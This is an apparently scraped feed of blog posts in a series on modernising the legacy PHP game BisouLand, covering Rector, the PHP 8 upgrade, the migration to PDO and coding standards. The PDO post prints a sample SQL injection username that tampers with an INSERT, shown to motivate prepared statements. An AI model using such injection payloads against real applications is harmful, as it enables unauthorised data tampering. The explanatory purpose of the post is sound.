        // PHPdoc array types
        AddParamArrayDocblockBasedOnArrayMapRector::class,
        AddParamArrayDocblockFromAssignsParamToParamReferenceRector::class,
        AddParamArrayDocblockFromDataProviderRector::class,
        AddParamArrayDocblockFromDimFetchAccessRector::class,
        AddReturnDocblockDataProviderRector::class,
        AddReturnDocblockForArrayDimAssignedObjectRector::class,
        AddReturnDocblockForCommonObjectDenominatorRector::class,
        AddReturnDocblockForJsonArrayRector::class,
        ClassMethodArrayDocblockParamFromLocalCallsRector::class,
        DocblockGetterReturnArrayFromPropertyDocblockVarRector::class,
        DocblockReturnArrayFromDirectArrayInstanceRector::class,
        DocblockVarArrayFromGetterReturnRector::class,
        DocblockVarArrayFromPropertyDefaultsRector::class,
        DocblockVarFromParamDocblockInConstructorRector::class,

        // Inherit parent visibility
        ChangeConstantVisibilityRector::class,
        ChangeMethodVisibilityRector::class,

        // More Coding Style
        ArraySpreadInsteadOfArrayMergeRector::class,
        StaticClosureRector::class,
    ]);
</code></pre>

<p>Not all rule sets have been added, for example we are missing:</p>

<ul>
<li><a href="https://getrector.com/find-rule?activeRectorSetGroup=core&amp;rectorSet=core-datetime-to-carbon">DateTime to Carbon</a></li>
<li><a href="https://getrector.com/find-rule?activeRectorSetGroup=core&amp;rectorSet=core-gmagick-to-imagick">Gmagick to imagick</a></li>
</ul>

<p>There are also some rules from added rulesets that we have decided to exclude:</p>

<ul>
<li><a href="https://getrector.com/rule-detail/combined-assign-rector">CombinedAssignRector</a>
Simplify <code>$value = $value + 5;</code> assignments to <code>$value += 5;</code></li>
<li><a href="https://getrector.com/rule-detail/encapsed-strings-to-sprintf-rector">EncapsedStringsToSprintfRector</a>
Convert <code>"{$value}"</code> to <code>sprintf('%s', $value)</code> or <code>''.$value</code></li>
</ul>

<p>Finally, there are some rules that are not part of <a href="https://getrector.com/find-rule?activeRectorSetGroup=core&amp;rectorSet=%3Anot-in-set">any rule set</a>,
which we have added one by one.</p>

<p>My advice to select only the rule set and rules you like, by first trying them all.</p>

<p>You can run Rector in "check only" mode for that purpose:</p>

<pre><code class="php">./vendor/bin/rector process --dry-run
</code></pre>

<h2 id="conclusion">Conclusion</h2>

<p>Rector is a powerful tool that goes way beyond simple one-off upgrades.</p>

<p>By integrating it into your CI workflow, you can enforce Code Quality rules
that continuously improve your codebase as it evolves.</p>

<p>The key difference with PHP CS Fixer is that Rector understands your code's
structure and types through AST parsing, which means it can make safe refactoring
decisions that a token-based tool simply cannot.</p>

<p>For BisouLand, we've seen Rector automatically:</p>

<ul>
<li>simplify control flow with early returns</li>
<li>enforce strict type comparisons where safe</li>
<li>add type declarations to functions</li>
<li>remove dead code and unnecessary conditions</li>
</ul>

<p>And as the codebase improves (more type hints, better structure),
Rector becomes even more effective at applying additional rules automatically.</p>

<p>My recommendation is to start with the rule sets that make sense for your project,
run them in <code>--dry-run</code> mode to review the changes,
and gradually build up your configuration by cherry-picking the rules you like.</p>

<p>Then keep Rector running in your CI to prevent regressions and maintain
the code quality improvements you've worked so hard to achieve.</p>

<p>Now with our almost not spaghetti code, we truly are in the future.</p>

<blockquote>
  <p>‚ÅâÔ∏è What do you mean, "still using old MySQL database"?</p>
</blockquote>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 6: From PHP 5 to PHP 8]]></title>
            <link href="/2025/11/19/xl-6-php-8.html"/>
            <updated>2025-11-19T00:00:00+00:00</updated>
            <id>/2025/11/19/xl-6-php-8.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò The Migration Warlord breaks the rusted shackles of PHP 5.6,
  leading the great exodus through the valleys of breaking changes,
  into the promised land of PHP 8.5 where type hints
  and constructor property promotion await in glory! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
<li><a href="/2025/09/24/xl-3-end-to-end-tests.html">üéØ written End to End Tests</a></li>
<li><a href="/2025/10/01/xl-4-coding-standards.html">üßπ created and applied Coding Standards</a></li>
<li><a href="/2025/10/22/xl-5-pdo.html">‚õÉ migrated to PDO</a></li>
</ol>

<p>This means we can run it locally (http://localhost:43000/),
and have some level of automated tests.</p>

<p>But it's still stuck in the past with PHP 5.6,
so let's upgrade it to PHP 8.5!</p>

<ul>
<li><a href="#docker">Docker</a></li>
<li><a href="#rector">Rector</a></li>
<li><a href="#php-cs-fixer">PHP CS Fixer</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="docker">Docker</h2>

<p>With the migration from the deprecated MySQL extension to PDO,
BisouLand's codebase is technically compatible with the latest PHP version.</p>

<p>At least that's what Claude tells me.</p>

<p>If that's true, then upgrading it is as simple as modifying the monolith's Dockerfile:</p>

<pre><code class="diff">- # Uses PHP 5.6 with PDO MySQL driver
+ # Uses PHP 8.5 with PDO MySQL driver

- FROM php:5.6-apache
- 
- # Update sources.list to use archive repositories for Debian Stretch
- RUN sed -i 's/deb.debian.org/archive.debian.org/g' /etc/apt/sources.list \
-     &amp;&amp; sed -i 's/security.debian.org/archive.debian.org/g' /etc/apt/sources.list \
-     &amp;&amp; sed -i '/stretch-updates/d' /etc/apt/sources.list
+ FROM php:8.5-apache
</code></pre>

<p>We can now build the new image:</p>

<pre><code class="console">cd apps/monolith
make app-init # docker down, docker build, docker up 
</code></pre>

<p>And that's it, welcome to the future!</p>

<h2 id="rector">Rector</h2>

<p>Your eXtreme Legacy application might not be as lucky as BisouLand,
and might require more work for an upgrade.</p>

<p>One way to do so is to use <a href="https://getrector.com/">Rector</a>,
an automated refactoring tool that uses the power of AST to make sure the
changes it makes are safe (i.e. non breaking) to do. Let's install it:</p>

<pre><code class="console">cd apps/qa
make composer arg='require --dev rector/rector'
</code></pre>

<p>We then need to configure it by creating the <code>rector.php</code> file:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

use Rector\Caching\ValueObject\Storage\FileCacheStorage;
use Rector\Config\RectorConfig;
use Rector\Set\ValueObject\SetList;

return RectorConfig::configure()
    -&gt;withCache(
        // CI compatible temporary paths for cach
        cacheDirectory: '/tmp/rector',
        cacheClass: FileCacheStorage::class,
    )
    -&gt;withPaths([
        __DIR__,
        __DIR__.'/../monolith',
    ])
    -&gt;withSkip([
        // ‚Äî‚Äî Excluded paths ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        // [qa]
        __DIR__.'/vendor',
        // [monolith]
        __DIR__.'/../monolith/vendor',
    ])
    -&gt;withSets([
        // ‚Äî‚Äî PHP ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        SetList::PHP_56,
    ]);
</code></pre>

<p>We can then run it as follow:</p>

<pre><code class="console">make rector # ./vendor/bin/rector
</code></pre>

<p>This initial run will ensure both the Monolith and QA apps are PHP 5.6 compliant,
which they are so no changes done.</p>

<p>We can be bold and brave and change Rector's config straight from <code>SetList::PHP_56</code>
to <code>SetList::PHP_84</code>, which will then make all the necessary upgrades from PHP 5.6 to 8.5,
but incremental steps are safer so we'll start with PHP 7.0:</p>

<pre><code class="console">sed -i -e 's/PHP_56/PHP_70/g' ./rector.php
# üçè On Mac: sed -i '' -e 's/PHP_56/PHP_70/g' ./rector.php
</code></pre>

<p>Running it (<code>make rector</code>) will spot one change that needs to be done:
replace <code>rand()</code> with <code>random_int()</code>:</p>

<pre><code class="diff">              // Si les bisous du d√©fenseurs sont pr√©sent, donc qu'il n'attaque pas.
              if (0 == $DefBloque) {
-                 $DefSmack = floor($DefSmack * (1 - 1 / rand(2, 10)));
-                 $DefBaiser = floor($DefBaiser * (1 - 1 / rand(2, 10)));
-                 $DefPelle = floor($DefPelle * (1 - 1 / rand(2, 10)));
+                 $DefSmack = floor($DefSmack * (1 - 1 / random_int(2, 10)));
+                 $DefBaiser = floor($DefBaiser * (1 - 1 / random_int(2, 10)));
+                 $DefPelle = floor($DefPelle * (1 - 1 / random_int(2, 10)));
              }
</code></pre>

<p>Technically <code>rand</code> is still supported in PHP 8,
but it does not generate cryptographically secure digits,
so <code>random_int</code> is recommended instead.</p>

<p>Next step is to upgrade to PHP 7.1, which detects no changes,
so we're safe to upgrade to PHP 7.2, which detects no changes,
so we're safe to upgrade to PHP 7.3, which detects some changes!</p>

<p>The function <code>setcookie</code> can take an array of options as a third parameter
(and yes, we store the password in the cookie. This will need to be fixed later):</p>

<pre><code class="diff">                      if (isset($_POST['auto'])) {
                          $timestamp_expire = time() + 30 * 24 * 3600;
-                         setcookie('pseudo', $pseudo, $timestamp_expire);
-                         setcookie('mdp', $mdp, $timestamp_expire);
+                         setcookie('pseudo', $pseudo, ['expires' =&gt; $timestamp_expire]);
+                         setcookie('mdp', $mdp, ['expires' =&gt; $timestamp_expire]);
                      }
</code></pre>

<p>Next step is to upgrade to PHP 7.4, which detects no changes,
so we're safe to upgrade to PHP 8.0, which detects no changes,
so we're safe to upgrade to PHP 8.1, which detects some changes!</p>

<p>This is an interesting one, as it enforces the type of variables for function
calls that expect for example a string but might receive <code>null</code>:</p>

<pre><code class="diff">      $pdo = bd_connect();
      if (isset($_POST['action'])) {
          $cout = 0;
-         $nuageCible = htmlentities($_POST['nuage']);
-         $positionCible = htmlentities($_POST['position']);
+         $nuageCible = htmlentities((string) $_POST['nuage']);
+         $positionCible = htmlentities((string) $_POST['position']);
</code></pre>

<p>Next step is to upgrade to PHP 8.1, which detects no changes,
so we're safe to upgrade to PHP 8.2, which detects no changes,
so we're safe to upgrade to PHP 8.3, which detects no changes,
so we're safe to upgrade to PHP 8.4, which detects some changes!</p>

<p>This one is for the QA app, it removes the now unnecessary parenthesis around
object instantiation:</p>

<pre><code class="diff">-         (new Dotenv())-&gt;load(__DIR__.'/../../../monolith/.env');
+         new Dotenv()-&gt;load(__DIR__.'/../../../monolith/.env');
</code></pre>

<p>And that's it.</p>

<h2 id="php-cs-fixer">PHP CS Fixer</h2>

<p>With the latest version of PHP,
we can change or Coding Style in <code>.php-cc-fixer.dist.php</code>
to take into account new changes:</p>

<pre><code class="diff">-         // ‚Äî‚Äî Disabed rules due to PHP version compatibility ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
- 
-         // [PER-CS2.0] Partially disabled due to PHP version constraints.
-         'trailing_comma_in_multiline' =&gt; [
-             'after_heredoc' =&gt; true,
-             'elements' =&gt; [
-                 // 'arguments', For PHP 7.3+
-                 // 'array_destructuring', For PHP 7.1+
-                 'arrays',
-                 // 'match', For PHP 8.0+
-                 // 'parameters', For PHP 8.0+
-             ],
-         ],
+         // ‚Äî‚Äî Overriden rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
+ 
+         // [Symfony] Adding `['elements']['parameters']` (Symfony doesn't have it)
+         'trailing_comma_in_multiline' =&gt; [
+             'after_heredoc' =&gt; true,
+             'elements' =&gt; [
+                 'arguments',
+                 'array_destructuring',
+                 'arrays',
+                 'match',
+                 'parameters',
+             ],
+         ] ,
</code></pre>

<p>But that's not all. PHP CS Fixer also has rule set to help us migrate the style
from old PHP versions to new ones, which we'll do incrementally.</p>

<p>First we enable the rule sets:</p>

<pre><code class="diff">          // ‚Äî‚Äî CS Rule Sets ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
          '@Symfony' =&gt; true,
          '@Symfony:risky' =&gt; true,
+         '@PHP7x0Migration' =&gt; true,
+         '@PHP7x0Migration:risky' =&gt; true,
</code></pre>

<p>And we run it with <code>make cs-fix</code>. It's detected some changes:
replacing <code>mt_rand</code> which is also not cryptographically secure with <code>random_int</code>:</p>

<pre><code class="diff">          // On choisi une valeur au hasard.

-         $FinalPos = $FreePos[mt_rand(0, $nbLibre - 1)];
+         $FinalPos = $FreePos[random_int(0, $nbLibre - 1)];
</code></pre>

<p>Next step we upgrade the rule set to PHP 7.1</p>

<pre><code class="console">sed -i -e 's/PHP7x0/PHP7x1/g' ./.php-cs-fixer.dist.php
# üçè On Mac: sed -i '' -e 's/PHP7x0/PHP7x1/g' ./php-cs-fixer.dist.php
</code></pre>

<p>Running it, we get <code>void</code> return type hints:</p>

<pre><code class="diff">- function GiveNewPosition($idJoueur)
+ function GiveNewPosition($idJoueur): void
  {
      $pdo = bd_connect();
      $sql_info = $pdo-&gt;query('SELECT nombre FROM nuage WHERE id=1');
</code></pre>

<p>Next step is to upgrade to PHP 7.2, which detects no changes,
so we're safe to upgrade to PHP 7.3, which detects some changes!</p>

<p>This one is related to HEREDOC indentation.</p>

<p>I'm gonna be brief now, as after that, upgrading all the way to PHP 8.5,
there were no changes.</p>

<h2 id="conclusion">Conclusion</h2>

<p>With a modern version of PHP, not only do we get security patches,
exciting new feature (typed code, constructor property promotion, readonly final classes, etc),
as well as access to many modern tools and libraries (composer, Symfony components, etc),
but we also get a boost in performance.</p>

<p>Let's back up that last claim by running some vanity benchmarks as follow:</p>

<ol>
<li>start a fresh Monolith container</li>
<li>sign up and log in a temporary account</li>
<li>test load the homepage, as a visitor (not logged in)</li>
<li>test load the Brain page (logged in)</li>
</ol>

<pre><code class="console"># Start fresh
cd apps/monolith
make app-init

BENCH_USER="BisouTest_bench"
BENCH_PASS="SuperSecret123"

# Sign up
curl -X POST 'http://localhost:43000/inscription.html' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "Ipseudo=${BENCH_USER}&amp;Imdp=${BENCH_PASS}&amp;Imdp2=${BENCH_PASS}&amp;inscription=S%27inscrire"

# Log in
BENCH_COOKIE=$(curl -X POST 'http://localhost:43000/redirect.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "pseudo=${BENCH_USER}&amp;mdp=${BENCH_PASS}&amp;connexion=Se+connecter" \
  -i -s | grep -i 'set-cookie: PHPSESSID' | sed 's/.*PHPSESSID=\([^;]*\).*/\1/' | tr -d '\r')

# Test load homepage (not signed in)
ab -l -q -k -c 50 -n 10000 http://localhost:43000/ \
    | grep -E "Complete requests|Failed requests|Exception|Requests per second|Time per request.*across"

# Test load Brain page (signed in)
ab -l -q -k -c 50 -n 10000 -C "PHPSESSID=$BENCH_COOKIE" http://localhost:43000/cerveau.html \
    | grep -E "Complete requests|Failed requests|Exception|Requests per second|Time per request.*across"
</code></pre>

<p>On my MacBook M4 (with Docker), the results are as follow:</p>

<ul>
<li>Homepage: <code>+8.9%</code> improvement

<ul>
<li>Requests per second (mean):
from <code>545.67</code> to <code>594.49</code></li>
<li>Time per request (ms, mean, across all concurrent requests):
from <code>1.833</code> to <code>1.682</code></li>
</ul></li>
<li>Brain Page: <code>+30.2%</code> improvement

<ul>
<li>Requests per second (mean):
from <code>313.88</code> to <code>408.78</code></li>
<li>Time per request (ms, mean, across all concurrent requests):
from <code>3.186</code> to <code>2.446</code></li>
</ul></li>
</ul>

<p>Surely with such almighty gains we won't need to rewrite BisouLand in go / rust.</p>

<blockquote>
  <p>‚ÅâÔ∏è What do you mean, "the code is still unrefactorable"?</p>
</blockquote>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 5: PDO]]></title>
            <link href="/2025/10/22/xl-5-pdo.html"/>
            <updated>2025-10-22T00:00:00+01:00</updated>
            <id>/2025/10/22/xl-5-pdo.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò The Parameter Paladin storms forth from the OWASP bastion,
  raising the impenetrable shield of Prepared Statements,
  against the shadow army of malicious injections,
  that seek to corrupt the sacred data temples! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
<li><a href="/2025/09/24/xl-3-end-to-end-tests.html">üéØ written End to End Tests</a></li>
<li><a href="/2025/10/01/xl-4-coding-standards.html">üßπ created and applied Coding Standards</a></li>
</ol>

<p>This means we can run it locally (http://localhost:8080/),
and have some level of automated tests.</p>

<p>But it's currently riddled with deprecated calls to <code>mysql_query()</code>,
so let's upgrade the codebase to PDO!</p>

<ul>
<li><a href="#sql-injection-vulnerabilities">SQL Injection vulnerabilities</a></li>
<li><a href="#docker">Docker</a></li>
<li><a href="#connection">Connection</a></li>
<li><a href="#queries">Queries</a></li>
<li><a href="#fixes">Fixes</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="sql-injection-vulnerabilities">SQL Injection vulnerabilities</h2>

<p>Before we start, a note on security vulnerabilities.</p>

<p>The BisouLand SQL queries are full of input values directly concatenated
in the SQL queries, like here:</p>

<pre><code class="php">// SignUp form: inscription.php
$result = mysql_query(
    'INSERT INTO membres (pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
    ."VALUES ('{$pseudo}', '{$hmdp}', '1', ".time().', '.time().", '300')"
);
</code></pre>

<p>This would clearly be a SQL injection risk,
as someone could submit the following username:</p>

<pre><code>Eisenberg', '938c2cc0dcc05f2b68c4287040cfcf71', '1', 1759645024, 1759645024, '42000'); --
</code></pre>

<p>Which would create the user as expected,
but with 42k Love Points instead of the expected 300:</p>

<pre><code class="sql">INSERT INTO membres (pseudo, mdp, confirmation, timestamp, lastconnect, amour)
VALUES ('Eisenberg', '938c2cc0dcc05f2b68c4287040cfcf71', '1', 1759645024, 1759645024, '42000');
-- ', '938c2cc0dcc05f2b68c4287040cfcf71', '1', 1759645024, 1759645024, '300')
</code></pre>

<p>However looking a bit closer at the code,
we can see that most of the time the user input is validated and sanitised,
for example in the sign-up form the username:</p>

<ul>
<li>cannot be too long</li>
<li>can only be alphanumerical characters</li>
<li><code>addslashes()</code> escapes <code>'</code>, <code>"</code>, <code>\</code> and NULL bytes</li>
<li><code>htmlentities()</code> escapes HTML characters like <code>&lt;</code>, <code>&gt;</code>, <code>'</code></li>
</ul>

<p>Which effectively prevents SQL Injection:</p>

<pre><code class="php">// SignUp form: inscription.php
$pseudo = htmlentities(addslashes($_POST['Ipseudo']));
$mdp = htmlentities(addslashes($_POST['Imdp']));

$taille = strlen(trim($_POST['Ipseudo']));
if ($taille &gt;= 4 &amp;&amp; $taille &lt;= 15) {
    // ...
    $result = mysql_query(
        'INSERT INTO membres (pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
        ." VALUES ('{$pseudo}', '{$hmdp}', '1', ".time().', '.time().", '300')"
    );
}
</code></pre>

<p>Regardless, using PDO with prepared statements will make sure we don't accidentally
introduce SQL vulnerabilities.</p>

<h2 id="docker">Docker</h2>

<p>The first thing we're going to do is update the <code>apps/monolith/Dockerfile</code>,
as we'll now need the PDO extension and its MySQL companion,
instead of the MySQL solo extension:</p>

<pre><code class="Dockerfile"># ...

# Install system dependencies and PHP extensions in single layer
RUN docker-php-ext-install pdo pdo_mysql \
    &amp;&amp; a2enmod rewrite

# ...
</code></pre>

<p>This change will require us to update the container:</p>

<pre><code class="console"># in apps/monolith
make down
make build
make up
</code></pre>

<h2 id="connection">Connection</h2>

<p>Then we have to take care of the <code>mysql_pconnect</code>,
located in <code>apps/monolith/phpincludes/bd.php</code>:</p>

<pre><code class="php">&lt;?php

include __DIR__.'/../config/parameters.php';

function bd_connect()
{
    mysql_pconnect(
        DATABASE_HOST.':'.DATABASE_PORT,
        DATABASE_USER,
        DATABASE_PASSWORD
    );
    mysql_select_db(DATABASE_NAME);
}
</code></pre>

<p>This creates a persistent connection, for the current HTTP request.</p>

<p>We're going to replace it with PDO (PHP Data Object, what a weird name),
the out of the box Database Abstraction Layer:</p>

<pre><code class="php">&lt;?php

include __DIR__.'/../config/parameters.php';

function bd_connect()
{
    static $pdo = null;

    if (null === $pdo) {
        $dsn = 'mysql:host='.DATABASE_HOST.';port='.DATABASE_PORT.';dbname='.DATABASE_NAME.';charset=utf8mb4';
        $options = [
            // Throw exceptions on error
            PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
            // Return query results as associative arrays (column name =&gt; value)
            PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
            // Use prepared statements at the database layer, for better security and performance
            PDO::ATTR_EMULATE_PREPARES =&gt; false,
        ];
        $pdo = new PDO($dsn, DATABASE_USER, DATABASE_PASSWORD, $options);
    }

    return $pdo;
}
</code></pre>

<p>We then need to change the usage of the function in the codebase:</p>

<ul>
<li>from <code>bd_connect()</code> to <code>$pdo = bd_connect()</code></li>
</ul>

<p>The <code>bd_connect</code> has been transformed into a Singleton,
it will always return the same instance of PDO (for the duration of the HTTP Request).</p>

<p>I'd normally frown at this but this is a temporary measure:
my intention is to later in the series introduce a Dependency Injection Container,
and instead of having those <code>$pdo = bd_connect()</code> statements,
we'll have <code>$pdo = $container-&gt;get(PDO::class);</code>.</p>

<h2 id="queries">Queries</h2>

<p>It's then a game of finding and replacing all <code>mysql_*</code> functions:</p>

<ul>
<li>from <code>mysql_query()</code> to <code>$pdo-&gt;prepare(); $pdo-&gt;execute()</code> or <code>$pdo-&gt;query()</code></li>
<li>from <code>mysql_fetch_assoc()</code> to <code>$pdo-&gt;fetch()</code></li>
<li>from <code>mysql_result()</code> to <code>$pdo-&gt;fetchColumn()</code></li>
<li>from <code>mysql_num_rows()</code> to <code>$pdo-&gt;rowCount()</code> or <code>$pdo-&gt;fetchColumn()</code></li>
<li>from <code>mysql_insert_id()</code> to <code>$pdo-&gt;lastInsertId()</code></li>
</ul>

<p>For example in <code>apps/monolith/web/phpincludes/inscription.php</code>:</p>

<pre><code class="php">$result = mysql_query(
    'INSERT INTO membres (pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
    ."VALUES ('{$pseudo}', '{$hmdp}', '1', ".time().', '.time().", '300')"
);
if (false === $result) {
    echo 'Error: '.mysql_error();
}
$id = mysql_insert_id();
</code></pre>

<p>Becomes:</p>

<pre><code class="php">$stmt = $pdo-&gt;prepare(
    'INSERT INTO membres (pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
    .' VALUES (:pseudo, :mdp, :confirmation, :timestamp, :lastconnect, :amour)'
);
$stmt-&gt;execute([
    'pseudo' =&gt; $pseudo,
    'mdp' =&gt; $hmdp,
    'confirmation' =&gt; 1,
    'timestamp' =&gt; time(),
    'lastconnect' =&gt; time(),
    'amour' =&gt; 300,
]);
$id = $pdo-&gt;lastInsertId();
</code></pre>

<p>There were 25 PHP files with ~250+ of such calls, by the way.</p>

<p>And before we forget,
with prepared statements we no longer need calls to <code>addslashes()</code>,
so we can also removed them.</p>

<h2 id="fixes">Fixes</h2>

<p>We shouldn't stop there. There's an issue we've encountered in a previous article,
where the code was using <code>''</code> for the <code>id</code> column in <code>INSERT</code> statements.</p>

<p>This was relying on string to integer conversion,
which MySQL supported until version 5.7.</p>

<p>After a quick look, I've found 5 more instances of these, which I've now fixed.</p>

<p>And last but not least, still on the topic of string to integer conversion,
there are other integer fields that are receiving strings:</p>

<ol>
<li><code>web/phpincludes/inscription.php</code>:

<ul>
<li><code>'1'</code> is used for the confirmation field, should be <code>1</code> (TINYINT field)</li>
<li><code>'300'</code> is used for the amour field, should be <code>300</code> (INT field)</li>
</ul></li>
<li><code>web/phpincludes/lire.php</code>: <code>'1'</code> is used for status (INT field)</li>
<li><code>web/phpincludes/attaque.php</code>: <code>'0'</code> is used for finaller (INT field)</li>
<li><code>web/news/liste_news.php</code>: <code>'0'</code> is used for timestamp_modification (INT field)</li>
<li><code>web/phpincludes/cerveau.php</code>: <code>'1'</code> is used for confirmation (TINYINT field)</li>
<li><code>web/phpincludes/membres.php</code>: <code>'1'</code> is used for confirmation (TINYINT field)</li>
</ol>

<h2 id="conclusion">Conclusion</h2>

<p>This has been a lot of effort, and there's seemingly not a lot to show for it.</p>

<p>But by switching from the MySQL extension to PDO, we've unlocked something amazing:
we will be able to upgrade to the latest version of PHP,
which will provide a big performance boost as well as many security patches.</p>

<p>And we will be able to switch to PostgreSQL!</p>

<blockquote>
  <p>‚ÅâÔ∏è <em>What do you mean, "PHP is slow and we should use go / rust"?</em></p>
</blockquote>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 4: Coding Standards]]></title>
            <link href="/2025/10/01/xl-4-coding-standards.html"/>
            <updated>2025-10-01T00:00:00+01:00</updated>
            <id>/2025/10/01/xl-4-coding-standards.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò The Coding Standards Inquisitor rises from the sulphurous pits of Legacy Chaos,
  brandishing the iron scriptures of Style Guides,
  purging the realm of inconsistent formatting with flames of automated linting! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
<li><a href="/2025/09/24/xl-3-end-to-end-tests.html">üéØ written End to End Tests</a></li>
</ol>

<p>This means we can run it locally (http://localhost:8080/),
and have some level of automated tests.</p>

<p>But the code is ugly!</p>

<p>So we're going to establish beautiful Coding Standards,
which will be today's fourth article focus,
and enforce them automatically using PHP CS Fixer.</p>

<ul>
<li><a href="#level-0%3A-setup">Level 0: setup</a></li>
<li><a href="#level-1%3A-psr-1">Level 1: PSR-1</a></li>
<li><a href="#level-2%3A-psr-2">Level 2: PSR-2</a></li>
<li><a href="#level-3%3A-psr-12">Level 3: PSR-12</a></li>
<li><a href="#level-4%3A-per-cs-2.0">Level 4: PER-CS 2.0</a></li>
<li><a href="#level-5%3A-symfony">Level 5: Symfony</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="level-0%3A-setup">Level 0: setup</h2>

<p>We will not start with the highest quality standard,
as this would make it too difficult to track the changes.</p>

<p>Instead we'll:</p>

<ul>
<li>start with an empty configuration, run the tool, check the changes</li>
<li>then add the smallest set of CS rule we can think of, run again and check</li>
<li>iterate by adding more and more rules</li>
</ul>

<p>Ideally, teams should discuss and agree on a select list of rules to follow,
but <a href="https://cs.symfony.com/doc/rules/index.html">the list of possible rules is too overwhelming</a>.</p>

<p>So instead of picking rules one by one,
we can rely on <a href="https://cs.symfony.com/doc/ruleSets/index.html">rule sets</a>.</p>

<p>My humble opinion is that the <a href="https://cs.symfony.com/doc/ruleSets/Symfony.html">Symfony CS</a>
are the best, but that'd be too many rules to add in one go.</p>

<p>If we check the Symfony rule set doc, at the top we can see <code>@PER-CS3x0</code>.</p>

<p>Rules that start with <code>@</code> are actually rulesets,
so Symfony depends on other smaller rulesets,
and those smaller rulesets also depend on other smaller rulesets.</p>

<p>It's a tedious task,
but we can navigate the documentation website,
construct the tree of rule sets used,
and then start with the smaller one:</p>

<ol>
<li><a href="https://www.php-fig.org/psr/psr-1/">PSR-1: Basic Coding Standard</a></li>
<li><a href="https://www.php-fig.org/psr/psr-2/">PSR-2: Coding Style Guide - deprecated</a></li>
<li><a href="https://www.php-fig.org/psr/psr-12/">PSR-12: Extended Coding Style</a></li>
<li><a href="https://www.php-fig.org/per/coding-style/">PER-CS 2.0: Coding Style</a>
(turns out there's a PER-CS 3.0 since July 2025!)</li>
</ol>

<p>For each rule set, we then check if anything is breaking,
and if so we exclude the specific rule.</p>

<p>Let's start with an empty configuration in <code>apps/qa/.php-cs-fixer.php.dist</code>:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
